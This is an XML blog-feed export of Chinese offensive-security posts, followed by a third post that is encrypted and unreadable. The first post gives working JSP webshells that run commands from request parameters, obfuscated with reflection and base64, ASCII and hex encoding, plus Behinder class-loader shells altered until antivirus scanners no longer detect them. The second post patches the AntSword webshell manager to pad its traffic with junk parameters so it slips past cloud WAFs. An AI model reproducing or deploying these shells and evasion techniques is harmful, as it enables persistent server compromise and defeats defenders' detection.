    <content type="text"><![CDATA[前言其他类型的webshell容易免杀的一个主要原因是有eval函数，能够把我们的加密几层后的payload进行解密然后用eval执行，从而绕过杀软的检测。然而由于JSP的语法没有所谓的eval函数，不像php等语言那么灵活，变形困难，所以JSP的免杀马比较少，相关的文章也比较少。能找到的公开文章中，LandGrey大佬的这一篇文章写的非常好，利用Java反射机制和Java类加载机制来构造免杀的JSP后门。但是文章中部分细节仅为一笔带过，对于没有学过JAVA的同学不太友好。并且这篇文章写在冰蝎出现之前，没有对冰蝎JSPshell免杀的相关内容。所以今天这篇文章就跟大家一起分享一下JSP的免杀姿势。基础知识JSP标签在JSP页面中嵌入java代码，首先要了解一下JSP标签的基本知识。1234&lt;%@ %&gt; 页面指令，设定页面属性和特征信息&lt;% %&gt; java代码片段，不能在此声明方法&lt;%! %&gt; java代码声明，声明全局变量或当前页面的方法&lt;%= %&gt; Java表达式JSP中的字符串混淆方式ASCII12String a=new String(new byte[] &#123; 121, 122, 100, 100, 77, 114, 54 &#125;); System.out.println(&quot;ASCII: &quot;+a);HEX123import javax.xml.bind.DatatypeConverter; String b= new String(DatatypeConverter.parseHexBinary(&quot;797a64644d7236&quot;)); System.out.println(&quot;HEX: &quot;+b);BASE64123import sun.misc.BASE64Decoder; String c = new String(new BASE64Decoder().decodeBuffer(&quot;eXpkZE1yNg==&quot;)); System.out.println(&quot;BASE64: &quot;+c);类反射首先要知道为什么免杀需要用到类反射类反射可以把我们想要调用的函数或者类的名字放到一个字符串的位置。此时也就相当于我们实现了php中的变量函数，就可以利用base64编码或者hex编码等来混淆关键函数。例子参考大白话说Java反射使用反射调用对象方法的步骤12345Class clz = Class.forName(&quot;test.Apple&quot;); // 获取类的 Class 对象实例Constructor appleConstructor = clz.getConstructor(); // 根据 Class 对象实例获取 Constructor 对象Object appleObj = appleConstructor.newInstance();// 使用 Constructor 对象的 newInstance 方法获取反射类对象Method setPriceMethod = clz.getMethod(&quot;setPrice&quot;, int.class); // 获取方法的 Method 对象setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法如果没有构造函数的情况下就更简单了1234Class clz = Class.forName(&quot;test.Apple&quot;); // 获取类的 Class 对象实例Object appleObj=clz.newInstance();// 直接获得clz类的一个实例化对象Method setPriceMethod = clz.getMethod(&quot;setPrice&quot;, int.class); // 获取方法的 Method 对象setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法从图中可以看到，我们用类反射调用了Apple类中的setPrice跟getPrice方法。其实也可以压缩一下写成一行的形式1Class.forName(&quot;test.Apple&quot;).getMethod(&quot;setPrice&quot;, int.class).invoke(Class.forName(&quot;test.Apple&quot;).newInstance(),20);不过当然正常人是不会这么写的。类加载在LandGrey大佬的文章中提到的类加载的意思是将获得Class对象的方式由Class rt= Class.forName(“java.lang.Runtime”); 改成Class rt = ClassLoader.getSystemClassLoader().loadClass(“java.lang.Runtime”);的形式。但是冰蝎作者在利用动态二进制加密实现新型一句话木马之Java篇中对于类加载是直接传送二进制字节码。这也是为什么冰蝎能够实现不到1KB的JSP一句话的原因：冰蝎可以做到动态解析二进制class字节码。学过java的同学应该都知道，java执行代码的时候都要先编译生成.class字节码文件，才能被jvm所执行。那么也就是说，如果我们能够实现任意class文件的加载，也就相当于实现了php中的eval函数。我们就用冰蝎中的例子首先写一个命令执行的类，调一个calc，但是我们不写主函数，也就是说我们先不让他运行。12345678910111213package test;import java.io.IOException;public class calc &#123; @Override public String toString() &#123; try &#123; Runtime.getRuntime().exec(&quot;calc.exe&quot;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return &quot;OK&quot;; &#125;&#125;在项目里生成之后，在out目录下可以看到编译好的二进制class文件。然后把它base64，保存到文件里，去除多余的换行接着生成一个loader类，用于加载我们的class文件1234567891011121314151617package test;import sun.misc.BASE64Decoder;public class loader &#123; public static class Myloader extends ClassLoader //继承ClassLoader &#123; public Class get(byte[] b) &#123; return super.defineClass(b, 0, b.length); &#125; &#125; public static void main(String[] args) throws Exception &#123; String classStr=&quot;xxxxxxxxxxxxxxxxx&quot;; // class的base64编码 BASE64Decoder code=new sun.misc.BASE64Decoder(); Class result=new Myloader().get(code.decodeBuffer(classStr));//将base64解码成byte数组，并传入t类的get函数 System.out.println(result.newInstance().toString()); &#125;&#125;运行后成功调用计算器。我们用类加载的方式成功执行了系统命令。对命令执行JSP一句话免杀JAVA执行系统命令的核心就是Runtime.getRuntime().exec(cmd)原型12345678910&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b,0,a)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt;经过二分法分析，发现特征码是在Runtime.getRuntime().exec这一句。不知道什么是二分法分析的看我以前的两篇webshell免杀文章。然后发现D盾对于JSP中只要有exec就会报一级。那么我们就可以利用类反射的方法来隐藏掉exec函数。类反射绕过1234567891011121314151617package test;import java.lang.reflect.Method;import java.util.Scanner;public class Test &#123; public static void main(String[] args) throws Exception &#123; String op = &quot;&quot;; Class rt = Class.forName(&quot;java.lang.Runtime&quot;); //加载Runtime类 Method gr = rt.getMethod(&quot;getRuntime&quot;); //获取getRuntime方法 Method ex = rt.getMethod(&quot;exec&quot;, String.class); //获取exec方法 Process e = (Process) ex.invoke(gr.invoke(null), &quot;cmd /c whoami&quot;); //invoke 传参调用 //以下代码是获取输出结果 Scanner sc = new Scanner(e.getInputStream()).useDelimiter(&quot;\\A&quot;); op = sc.hasNext() ? sc.next() : op; sc.close(); System.out.print(op); &#125;&#125;可以看到成功执行了whoami命令那么接下来就是把他放到jsp里面。利用base64编码123456789101112131415161718192021&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;sun.misc.BASE64Decoder&quot; %&gt;&lt;% if(request.getParameter(&quot;cmd&quot;)!=null)&#123; BASE64Decoder decoder = new BASE64Decoder(); Class rt = Class.forName(new String(decoder.decodeBuffer(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;))); Process e = (Process) rt.getMethod(new String(decoder.decodeBuffer(&quot;ZXhlYw==&quot;)), String.class).invoke(rt.getMethod(new String(decoder.decodeBuffer(&quot;Z2V0UnVudGltZQ==&quot;))).invoke(null, new Object[]&#123;&#125;), request.getParameter(&quot;cmd&quot;) ); java.io.InputStream in = e.getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt;可以bypass D盾跟百度scanner，下面的都是免杀的，就不截图了。利用ASCII编码1234567891011&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;% if(request.getParameter(&quot;cmd&quot;)!=null)&#123; Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;)); Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) ); java.io.InputStream in = e.getInputStream(); int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt;利用HEX编码1234567891011&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; import=&quot;javax.xml.bind.DatatypeConverter&quot; language=&quot;java&quot; %&gt;&lt;% if(request.getParameter(&quot;cmd&quot;)!=null)&#123; Class rt = Class.forName(new String(DatatypeConverter.parseHexBinary(&quot;6a6176612e6c616e672e52756e74696d65&quot;))); Process e = (Process) rt.getMethod(new String(DatatypeConverter.parseHexBinary(&quot;65786563&quot;)), String.class).invoke(rt.getMethod(new String(DatatypeConverter.parseHexBinary(&quot;67657452756e74696d65&quot;))).invoke(null), request.getParameter(&quot;cmd&quot;) ); java.io.InputStream in = e.getInputStream(); int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt;寻找其他类java中与执行命令相关的主要有两个类12java.lang.Runtimejava.lang.ProcessBuilder我们上文中反射了Runtime类，那么同样我们也可以反射ProcessBuilder类。原理是相同的，此处不再具体举例实现。对于冰蝎JSP一句话的免杀冰蝎JSP一句话的实现是我最佩服的一点，也是我今后想要加入到蚁剑中的功能。由于冰蝎中改写的是Object类，所以几乎全部都是非敏感函数。目前各大杀软查杀的规则也并不是特别完善，其实特别容易免杀。免杀D盾经过二分法查找特征码，D盾对于冰蝎的查杀规则是这一句1new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);为了简洁冰蝎作者把很多东西都写到一行里了。那么我们就把其中的变量拆出来试试。把base64解密那一块给抠出来，实例化给decoder变量。123456789&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));BASE64Decoder decoder=new sun.misc.BASE64Decoder();new U(this.getClass().getClassLoader()).g(c.doFinal(decoder.decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;就已经可以过D盾了经过测试随便拆其他的也可以，再拆一个uploadString123456789&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;)); String uploadString= request.getReader().readLine();new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%&gt;也可以免杀免杀百度scanner拆最后一句免杀不了scanner经过测试scanner识别冰蝎的特征在这一句1c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));那就再把这一句给拆了12345678910&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);SecretKeySpec sec=new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;); c.init(2,sec); String uploadString= request.getReader().readLine();new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%&gt;这时候就可以两个都免杀了最后其实还有很多方式值得去探索，就比如命令执行一句话那里。我们可以在shell里只放类加载函数，而不含具体的payload。然后写一个命令类，类里接收一个String类型的参数，作为所要执行的cmd语句。然后把它编译成二进制class，通过GET型或者POST型传过去。其中cmd参数也从GET传入，经过shell发送到命令执行类中，就相当于实现了php中形如http://test.com/shell.php?func=system&amp;cmd=whoami 的回调函数后门。其中有一个师傅已经实现了菜刀的远程加载类，文章地址：http://p2j.cn/?p=1627不过所有的jar包都放在作者的博客上，也就是说每个shell都会先访问他的博客，还是建议自己搭建。套路都是差不多的，自己多动手，想一想，你肯定能做的比我更好。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蚁剑改造计划之增加垃圾数据]]></title>
    <url>%2Fposts%2Fantsword-diy-1%2F</url>
    <content type="text"><![CDATA[前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。正文思路简介大家都知道垃圾数据填充可以用于SQL注入的绕过，原理就是WAF在遇到大量的GET或者POST参数的时候就会直接把数据直接抛给后端，从而就可以绕过各种各样恶心的过滤，大家常常把这种方法叫做缓冲区溢出。原因可能是WAF厂商考虑到防止自身程序对于流量分析时间过长，导致用户正常的业务无法访问，所以不得已直接丢给后端。因为咱也没看过WAF内部的规则是怎么写的，所以暂时这样猜想。同样的，既然都是直接把数据抛给后端，那么这种办法是否可以用于一句话流量的绕过呢，答案当然是可以的，只不过要稍加修改。因为实际测试过程中发现，仅仅在payload前面加上超长字符串对于某里云来说并没有卵用，似乎已经免疫。但是换了个思路，发现改成增加大量垃圾键值对之后就可以bypass，那就暂且把这种方法叫做增加垃圾数据绕过法吧。这篇文章主要介绍这种方法，以及如何把这个功能移植到蚁剑上。编码器实现这篇文章本来是几个月前发在自己的星球里，名字叫做蚁剑编码器之流量混淆。当时想着怎么方便怎么来，所以采用的是最简单、改动最小的一种实现方式–编码器实现。这里全部采用了随机的方式来生成垃圾流量，随机变量名长度，随机变量值大小，随机变量个数。12345678910111213141516171819let varname_min = 5; //变量名最小长度 let varname_max = 15; // 变量名最大长度 let data_min = 200; // 变量值最小长度 let data_max = 250; // 变量值最大长度 let num_min = 150; // 变量最小个数 let num_max = 250; // 变量最大个数 function randomString(length) &#123; // 生成随机字符串 //let chars=&apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; let chars = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; let result = &apos;&apos;; for (let i = length; i &gt; 0; --i) result += chars[Math.floor(Math.random() * chars.length)]; return result; &#125; function randomInt(min, max) &#123; //生成指定范围内的随机数 return parseInt(Math.random() * (max - min + 1) + min, 10); &#125; for (let i = 0; i &lt; randomInt(num_min, num_max); i++) &#123; //将混淆流量放入到payload数组中 data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max)); &#125;那么怎么用呢很简单，就直接把这段代码放到普通编码器里就可以了，这里以最基础的也是被各类WAF杀得妈都不认的base64编码器为例123456789101112131415161718192021222324252627282930&apos;use strict&apos;;/*code by yzddMr6*/module.exports = (pwd, data, ext = &#123;&#125;) =&gt; &#123; let varname_min = 5; let varname_max = 15; let data_min = 200; let data_max = 250; let num_min = 100; let num_max = 200; let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`; data[randomID] = Buffer.from(data[&apos;_&apos;]).toString(&apos;base64&apos;); function randomString(length) &#123; //let chars=&apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; let chars = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; let result = &apos;&apos;; for (let i = length; i &gt; 0; --i) result += chars[Math.floor(Math.random() * chars.length)]; return result; &#125; function randomInt(min, max) &#123; return parseInt(Math.random() * (max - min + 1) + min, 10); &#125; for (let i = 0; i &lt; randomInt(num_min, num_max); i++) &#123; data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max)); &#125; data[pwd] = `@eval(base64_decode($_POST[$&#123;randomID&#125;]));`; delete data[&apos;_&apos;]; return data;&#125;过云锁测试本来想用安全狗，结果发现好像免费版不能拦截一句话。那就用云锁开刀吧。首先在虚拟机里放个一句话，就用某辣鸡项目生成的可以正常运行然后使用蚁剑默认的base64编码器连接试一下云锁直接drop了数据包，没有返回，在云锁控制端显示受到攻击然后使用我们上面的流量混淆编码器shell正常连接，成功bypass云锁。过阿里云测试这一部分是后来补上的，因为白嫖的阿里云还有一天就到期了。。。众所周知阿里云是以封IP著名，一言不合就全网ban你。不仅站x不了，甚至很多其他网站都打不开。。。反正要到期了，码也懒得打了。首先用backdoor study搭建个环境这时候要找一个免杀马放上去，不然的话连接之前就被阿里云ban了然后随便找个蚁剑的默认编码器连上去，第一个包还有回显，发第二个包的时候就已经被封IP了这时候换上加了垃圾数据污染后的编码器正常执行命令写文件测试bypass阿里云蚁剑核心功能实现理论上这种方法不管是asp php aspx jsp都可以用到，如果按照编码器实现的话就要建立四个编码器，觉得还是加入到核心功能中比较好。这几天看了一下蚁剑的架构，感叹于设计者思路的精妙。首先我们可以看看他modules目录下的request模块的内容可以看到两个if else 语句12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/** * 监听HTTP请求 * @param &#123;Object&#125; event ipcMain事件对象 * @param &#123;Object&#125; opts 请求配置 * @return &#123;[type]&#125; [description] */ onRequest(event, opts) &#123; logger.debug(&apos;onRequest::opts&apos;, opts); if (opts[&apos;url&apos;].match(CONF.urlblacklist)) &#123; return event .sender .send(&apos;request-error-&apos; + opts[&apos;hash&apos;], &quot;Blacklist URL&quot;); &#125; let _request = superagent.post(opts[&apos;url&apos;]); // 设置headers _request.set(&apos;User-Agent&apos;, USER_AGENT); // 自定义headers for (let _ in opts.headers) &#123; _request.set(_, opts.headers[_]); &#125; // 自定义body const _postData = Object.assign(&#123;&#125;, opts.body, opts.data); if (opts[&apos;useChunk&apos;] == 1) &#123; logger.debug(&quot;request with Chunked&quot;); let _postarr = []; for (var key in _postData) &#123; if (_postData.hasOwnProperty(key)) &#123; let _tmp = encodeURIComponent(_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) &#123; return unescape($1); &#125;); // 后续可能需要二次处理的在这里追加 _postarr.push(`$&#123;key&#125;=$&#123;_tmp&#125;`); &#125; &#125; let antstream = new AntRead(_postarr.join(&quot;&amp;&quot;), &#123; &apos;step&apos;: parseInt(opts[&apos;chunkStepMin&apos;]), &apos;stepmax&apos;: parseInt(opts[&apos;chunkStepMax&apos;]) &#125;); xxxxxxx &#125; else &#123; // 通过替换函数方式来实现发包方式切换, 后续可改成别的 const old_send = _request.send; let _postarr = []; if (opts[&apos;useMultipart&apos;] == 1) &#123; _request.send = _request.field; for (var key in _postData) &#123; if (_postData.hasOwnProperty(key)) &#123; let _tmp = (_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) &#123; return unescape($1) &#125;); _postarr[key] = _tmp; &#125; &#125; &#125; else &#123; _request.send = old_send; for (var key in _postData) &#123; if (_postData.hasOwnProperty(key)) &#123; let _tmp = encodeURIComponent(_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) &#123; return unescape($1) &#125;); // 后续可能需要二次处理的在这里追加 _postarr.push(`$&#123;key&#125;=$&#123;_tmp&#125;`); &#125; &#125; _postarr = _postarr.join(&apos;&amp;&apos;); &#125;大概就是说如果开启了chunk传输后不拉不拉，否则的话就看看是否开启了Multipart，如果开启了不拉不拉，否则咕叽咕叽。主要的payload是以字典的形式放到_postData中，然后字典键跟值用=连接后放到_postarr数组中，最后再把_postarr数组用&amp;连接起来就是我们最终发包的payload了。那么这里也就是我们要下手修改的地方，照葫芦画瓢，再增加一个else语句因为我这里都改好了，就直接截图说要改哪些点吧。1opts`为在界面中选择的选项，这里起个名字叫`addMassData然后要到source/core/base.js中增加你的配置选项，注意的是蚁剑把普通请求跟下载请求的发包是分开的，所以需要改两处，自己vscode搜一下改一下。123456789101112131415161718192021// 发送请求数据 .send(&apos;request&apos;, &#123; url: this.__opts__[&apos;url&apos;], hash: hash, data: opt[&apos;data&apos;], tag_s: opt[&apos;tag_s&apos;], tag_e: opt[&apos;tag_e&apos;], encode: this.__opts__[&apos;encode&apos;], ignoreHTTPS: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;ignore-https&apos;] === 1, useChunk: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;use-chunk&apos;] === 1, chunkStepMin: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;chunk-step-byte-min&apos;] || 2, chunkStepMax: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;chunk-step-byte-max&apos;] || 3, useMultipart: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;use-multipart&apos;] === 1, addMassData: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;add-MassData&apos;] === 1, useRandomVariable: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;use-random-variable&apos;] === 1, timeout: parseInt((this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;request-timeout&apos;]), headers: (this.__opts__[&apos;httpConf&apos;] || &#123;&#125;)[&apos;headers&apos;] || &#123;&#125;, body: (this.__opts__[&apos;httpConf&apos;] || &#123;&#125;)[&apos;body&apos;] || &#123;&#125; &#125;); &#125;) &#125;后端改完之后要改前端了，前端修改内容是在source\modules\shellmanager\list\form.js中存放增加一个checkbox，注意label名字不要写错。然后改语言文件，这个没什么好说的。全部改完之后重启蚁剑(注意是把软件x掉重新双击打开，否则某些改动不会更新)，设置中就可以看到我们新增加的增加垃圾数据选项了选中后发包测试一下可以看到已经成功啦 一半接着发现一个奇怪的问题，每次payload都是在第一个这样肯定是不行的，所以我们还需要写一个随机函数，让字典随机排序没有现成的函数，随手搓一个附上辣鸡代码123456789101112function randomDict(dic)&#123; let tmparray=[] for(let i in dic)&#123; tmparray.push(i) &#125; tmparray=tmparray.sort((a, b)=&gt; &#123; return Math.random() &gt; 0.5 ? -1 : 1; &#125;) let finaldata=&#123;&#125; tmparray.forEach(i =&gt; &#123; finaldata[i]=dic[i]&#125;);return finaldata&#125;然后出现了点小插曲因为_postData是const类型，不能直接修改既然追求刺激，那就贯彻到底啦，直接改成let再试一下就可以实现字典随机排序了发现还可以正常使用，改了就改了吧asp测试aspx测试asp,aspx类型的shell都可以正常使用最后参数个数可以根据实际情况自行修改，不过一般也不需要改，所以就没有写到UI中。把参数个数改大可能会绕过更多waf，但是同样带来一个问题就是响应包会很慢，网络不好的情况下慎用。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSF免杀360+火绒上线(三)]]></title>
    <url>%2Fposts%2Fshellcode-bypass-360-3%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! U2FsdGVkX19lclNIVSGVy9lesomBfW/B5kWqei1qsytZaHWQZDAZm0qVrRqKrUqetXD22DZNoOxPYEOcCMcBYZLnKG1s0BBQagIMbTUX8zFz2rR5n1dtLrefpGWwrRjfV1olYjROELIyTOfI0YZf67hamQO5meKKAIp0QSQpF2+23ZhBntou09vyOJ+/OdiKTs2Nyw9ljoFhN8gq/BIhoEIt0wTvOy/wOSEKLRH+CoYXZURG9LQWjnMHvfzpMTQhwdI9dom8iIR5N2dDIaC+M1hobHcejoc9e8Lfc89g0xUGgvj3s9swvThXZBNGholENw3rLVh16Turw2BVteghNyb2zXkB0K9JHDCOm437ZchVBQIbFj5X3qfGm8vTbhWnP/nICgqNMbgxgsfL1a/eiGvsLO/wWFDHi94vGp70P4NWSVY8ZE0yYb5N5hdUQ8GGtZSzy5DDcYRe+QlCUDlWEaPNoUvOi9DNsA3wZkS8pnTCy5rmfzOiJPfz4I4Kod6mNM9fRfvqLN9eLING61z9ljXDrztbIF+QQqnTRocWVSnK2Zdk9nmVumQiuBjjEhBXNL0fk+MT5F9m68iOeE/YSY3jwHewn7p6s8pOYKmtrjueic+m/QcDqjohgHJrIBdU3QBPeb35CXGJqwzeyCWfL+D2IJLsAdQE+mtiWUWQAwxkaEjy2PV+zzVOyDY6IInuJytGuaugS673wo2pgNGO1na3dW+bfawC9hBUdamvC286WvuuXPVpn1xevun/Yb+OEDoXzbBvy+00Ah2WZxSR86pBwKdfiwF2lgCXi8Tq9zBQ2wDJyGKWIRhoU4hUu0n3GD0NM9SG60YJSuqJnXOUF5oLO2h8iGrSXv4SoQsA1raSbukz3wLpS8+xThWczE3OSoj/Wph/Vk9C0KKpSy381S3838zEOM3lZuVqh6KikkdDcMvlr/hUW5LbRb+FcrJqfBW/cH3ph1eGY24f27+Vtt2pw9f7u+4ItdxfCRc6ZxjZnEHPW6ulvQlLgAKDSTjrdhAMyN+5ViQCAFAVSl8DEu40fOeAP+7AJ34Wd67HirGqUrftxnEevwPNp0p33ksrub0VCXCV4dmE47f3A3TnR3hb58ACiB3mbQ2ZDccA3mdkGK8MMXazSJpPfea0HEZS0tf+SxHDmzRVHW4jDzwBeC1pJGovmXgwiAaSlv1kINDRM+8SvLXu7ANOgqsvvf9hAimNH+XDvDHh2AGjlthQxQicPvaSTZ3MKNKQaIiaV8KfuCGTp3VZzwWgsu9y6gZznUmU0pPIExVKKkKlNeNYm63WnedaxwnoBVmCOupHmWB0U8sZKbfL6Ygcn0ygyH/iqbgDasijtYRKfjSGyq3UUm80DPKRROkUjplG7wGrasWXffMw1cvbNEctr1Hmdmq1AafHdyFOivcmo5anvluJW5F2bXdZ0hINX8s/nwJef728QJ+g8p6rBaAed7beqqoCkhvf/j+5AL96klLUpZFlgJgRcNVdIoLBD8W4NvS+6T0Yw9LtwwAFHw+PxGklesl85hr+kPNQHAN752bS2WM2af6tt3DJQFqcz8YyzEfMZ4T29c4LCZh5ULYYB1WxLIIS//4tfcsjDEtGfi6fIYd0ETTchT2sVTVH6SrCX1xeDaVFfsxtp5PzceI6Y8pRE/RBKIOMkboG6Xw5rQQRNi1bNNAnbv5LBr5Yq3PMGvu4ywpgCP0IsCjGtiwJVQwdo5HoBS8JuFo+zAn2G0CLO/Iq7wTNzl6BDgET4KzRWniTqNFfDnydwEe6AqnNkDVlY2LI9fNqjKJg1pzlmyq41qY1Ye80njptbZFEQSp6F4lnpBWlhBoWChccZQ9jxW1C7LfcU6SAdmWnJjeH2zGZU682fkBJOI8HXSCpOdYqgfd/Y3x+8LCUj2jAmrNK9VG9R5eq0G1MDAAqGTyGz6EWd/fai2pmBcwHp0aK1WNMPIV7snfyTCb3/wfFQ00GZ2DdtI8FdsME2Mjn1c0CQfjb0bwMXHjCWN68/0a+89LFVZVbu+dh1Z+HyyPQXL/+eqJzre1ljLoVK7X5E0xsbovXaXHekwwPc9QAtVec19gAONgIsKXkSRkumJj9fdw4pyh4JKBXRbF/L0zr8++giEqF7Pb4maS2EYxTl8RSn8Cu/774wNMEm4ujcEueFgN8j1mcxoDy/I1zaYy7YVFB7mLOdtXaICrxyRGo1jrYGP0lJf2/jl+M+QPJShJoROWiYXOUG3yqM6H8rtQPR8NKpRKMW/CMJCEMW1KIS5lX9xROBiYvziKxzPXeNCo0fiej7Zi0S8oEpsMvz2pulBrYbIdXq3aWUnXPe6HQe2bLJQkwGQY3GAMi6o4emebrF251KwRWbkp2FlDODLIq3Tc1+c5zdM88SPt3n/YsfwIpW5/STBIwbU4QcLHhdHuffZC7LbjSKZnCfXrZZ7sm9RRqvapjnB5y0KpuuvyshLoE3vQLxgdLmiqX4OmoURvZ2zXzGVGzg7yG1md/N/UW+koyWWxriGL1exvh4XFYnZnMKn37F9zz7y/bKBw1KWjgjyD0vv3hqRIivIlykHclUU7jdRrmlZuPk5w2v4wO3Dk5jqfhWARLTqD0n1j+A2TdLDQtE0iyEvXmHb3POco4f85a2Z/TnhCXPcb8StTTHgH/Y8KdV9uiWVHQe+hmqPKo6w5Kdxcfk2VolOujeBdbhezzDOGIaMmg3mPrIIfiqaSixRnkGGpC5ZpxLNnUwKrbpPE3V4Bnt/h6pQSc1PZxmDwNrM0oDw41cXlJ/jRbIsm3QRur4JAvA4m/EpDpXRQamyFvSnjR9w5PsZTFsN55t/ZRLjpRmeJKx0v0I2riR7BXNMuMZtFWcuZfZzXvMnic5RIOA6VbuLNUOoF+fKHOJC06iJtVKcerpJueVz6UowHSTEFpYvCciz/sI7Ni+jiRT97CiJjJJnxw55bKmXi5ZAw255ciHw1SvVWMzMgBQUJCME/MY0dQo2SWypDWb4qr5dCb1k0XaIt5zcBrW1siFJhFxR9qESot0YWw5UF38MdlUDaHQq1grzpph40VIJGdB6v9gI5khm7QICghZ1iFRei3CjEZ7ySbKpTb7mWRqn735P+F1B2a6squYp3sOXbJFwVVsonqH5cZv8LQyp2KPxe8XF/mcX7fXSrcVXJ8KoiqRtaMOldwEW+uGDJMaer0sUCpZmR0YEVTyEL6+Y6y0RJ/uZ1xVUAiZumyAja3zZ4MKW/hZTHhhJ